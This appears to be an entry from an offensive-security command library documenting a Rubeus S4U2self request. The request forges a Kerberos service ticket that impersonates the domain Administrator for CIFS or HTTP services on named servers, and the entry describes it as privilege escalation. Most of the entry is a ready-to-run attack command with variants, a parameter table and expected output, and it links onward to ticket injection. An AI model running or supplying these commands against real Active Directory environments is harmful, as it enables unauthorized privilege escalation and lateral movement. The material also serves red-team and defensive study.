---
id: 6abb28b1-ae64-41a9-b75e-0a6fdcd98163
name: rubeus-s4u-self-impersonate-admin-base64
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator"
  /altservice:"cifs/srv001.domain.local" /ticket:"$_BASE64_TGT"
output: null
created_at: '2023-04-06T03:56:07.821348+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
verified: true
validated: true
---

# rubeus-s4u-self-impersonate-admin-base64

## Command

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"$_BASE64_TGT"
```

## Description

This command uses Rubeus to perform an S4U2self request, generating a service ticket impersonating the domain Administrator for a CIFS service on a target server, using a provided base64-encoded TGT. It is used in privilege escalation scenarios to forge Kerberos tickets without the target's password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /self | Enables S4U2self mode for self-impersonation | Yes |
| /nowrap | Outputs ticket without base64 wrapping | Yes |
| /impersonateuser:"Administrator" | User to impersonate (e.g., domain admin) | Yes |
| /altservice:"cifs/srv001.domain.local" | Target service principal (SPN) for the ticket | Yes |
| /ticket:"$_BASE64_TGT" | Base64-encoded input TGT | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"doIF...base64ticket"
```

### Advanced Usage

Use with a different service:

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"HTTP/dc01.domain.local" /ticket:"$_BASE64_TGT"
```

## Expected Output

Successful execution displays:

```
[+] Action: S4U
[+] Impersonating: Administrator
[+] Service: cifs/srv001.domain.local
[+] Ticket: doIF... (base64 TGS ticket)
```
The base64 ticket can then be used for further actions like PTT injection.

## Related

- [[commands/rubeus-ptt-inject-base64-ticket]]
- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
